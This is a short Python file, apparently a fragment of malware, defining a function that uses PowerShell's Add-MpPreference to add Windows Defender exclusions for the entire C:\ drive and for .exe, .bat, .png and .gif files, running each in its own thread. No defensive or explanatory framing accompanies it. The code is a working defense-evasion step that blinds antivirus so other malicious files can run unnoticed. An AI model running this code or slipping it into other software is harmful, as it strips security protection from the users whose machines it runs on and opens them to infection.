import os,threading
def excludeme():
    def add_exclusion(path_or_extension):
        os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{path_or_extension}\'"')

    threads = []
    exclusions = ['C:\\', '.exe', '.png', '.bat', '.gif']
    for exclusion in exclusions:
        thread = threading.Thread(target=add_exclusion, args=(exclusion,))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
